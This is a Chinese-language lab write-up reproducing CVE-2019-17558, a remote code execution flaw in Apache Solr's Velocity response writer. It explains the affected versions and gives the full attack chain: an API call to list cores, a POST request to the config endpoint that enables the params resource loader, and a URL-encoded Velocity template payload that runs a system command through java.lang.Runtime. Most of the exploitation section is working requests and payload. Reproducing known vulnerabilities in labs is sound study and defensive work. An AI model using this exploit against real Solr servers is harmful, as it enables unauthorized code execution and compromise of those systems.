# 通过Velocity自定义模板执行Apache Solr远程执行代码（CVE-2019-17558）

###### by ADummy

### 0x00利用路线

​			Burpsuite发包获取API名称--->`params.resource.loader.enabled`通过API启用配置--->模板命令执行

### 0x01漏洞介绍			

​			Solr是基于Apache Lucene（TM）构建的流行，快速，开放源代码的企业搜索平台。

从Apache Solr 5.0.0到Apache Solr 8.3.1容易受到通过VelocityResponseWriter的远程执行代码的攻击。可以通过configset`velocity/`目录中的Velocity模板或作为参数来提供Velocity模板。用户定义的配置集可能包含可渲染的，可能是恶意的模板。参数提供的模板默认情况下处于禁用状态，但可以`params.resource.loader.enabled`通过定义该属性设置为的响应编写器进行设置来启用`true`。定义响应编写器需要配置API访问。Solr 8.4完全删除了params资源加载程序，并且仅在configset为`trusted`（已通过身份验证的用户上传）时才启用configset提供的模板呈现。

##### 影响版本

```
5.0.0 < Apache Solr < 8.3.1
```

### 0x02漏洞复现

首先，您需要通过以下API获取所有内核名称：

```
http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json
```

这`demo`是这里唯一的核心：

![Apache_Solr_Velocity_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_Solr_Velocity_RCE_1.jpg)



`params.resource.loader.enabled`通过以下API启用配置，API端点为`/solr/[core name]/config`：

```
POST /solr/demo/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

![Apache_Solr_Velocity_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_Solr_Velocity_RCE_2.jpg)

然后，通过Velocity模板触发漏洞：

```
http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

![Apache_Solr_Velocity_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_Solr_Velocity_RCE_3.jpg)

### 0x03参考资料

https://nvd.nist.gov/vuln/detail/CVE-2019-17558

https://issues.apache.org/jira/browse/SOLR-13971

https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133

https://github.com/jas502n/solr_rce